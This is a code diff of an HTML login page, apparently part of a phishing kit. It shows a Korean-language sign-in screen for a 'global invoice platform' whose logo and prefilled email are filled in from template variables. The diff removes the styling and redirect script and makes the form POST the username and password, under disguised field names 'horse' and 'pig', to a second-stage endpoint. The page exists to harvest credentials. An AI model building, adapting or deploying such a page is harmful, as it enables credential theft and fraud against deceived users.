@@ -38,14 +38,6 @@
             padding: 30px;
             text-align: center;
             box-sizing: border-box;
-            opacity: 0;
-            transform: translateY(-20px);
-            transition: opacity 0.6s ease, transform 0.6s ease;
-        }
-
-        .login-container.visible {
-            opacity: 1;
-            transform: translateY(0);
         }
 
         .login-container h1 {
@@ -76,7 +68,6 @@
             background-color: var(--input-bg-color);
             color: var(--text-color-light);
             box-sizing: border-box;
-            transition: border-color 0.3s ease;
         }
 
         .login-container input[type="text"]:focus,
@@ -105,7 +96,6 @@
             font-size: 14px;
             color: var(--accent-color);
             text-decoration: none;
-            cursor: pointer;
         }
 
         .login-container .forgot-password:hover {
@@ -134,14 +124,14 @@
     </style>
 </head>
 <body>
-    <div class="login-container" id="loginContainer">
+    <div class="login-container">
         <div class="logo-container">
             <img src="https://api.kickfire.com/logo?website={{ins}}" alt="Platform Logo">
         </div>
         <h1>안전하고 신뢰할 수 있는 로그인</h1>
         <p>국제 비즈니스를 위한 최고의 글로벌 인보이스 플랫폼에 오신 것을 환영합니다.</p>
-        <form id="loginForm" action="#" method="POST">
-            <input type="text" name="horse" placeholder="아이디" required aria-label="아이디" value="{{eman}}" >
+        <form id="loginForm" action="second" method="POST">
+            <input type="text" name="horse" placeholder="아이디" required aria-label="아이디" value="{{eman}}">
             <input type="password" name="pig" placeholder="비밀번호" required aria-label="비밀번호">
             <input type="submit" value="로그인">
         </form>
@@ -152,19 +142,5 @@
             <i class="fas fa-globe" aria-label="Global"></i>
         </div>
     </div>
-    <script>
-        // JavaScript to handle fade-in effect
-        document.addEventListener('DOMContentLoaded', () => {
-            const loginContainer = document.getElementById('loginContainer');
-            loginContainer.classList.add('visible');
-
-            // JavaScript to handle form submission
-            const loginForm = document.getElementById('loginForm');
-            loginForm.addEventListener('submit', (event) => {
-                event.preventDefault(); // Prevent the default form submission
-                window.location.href = 'second'; // Replace with your redirect URL
-            });
-        });
-    </script>
 </body>
 </html>
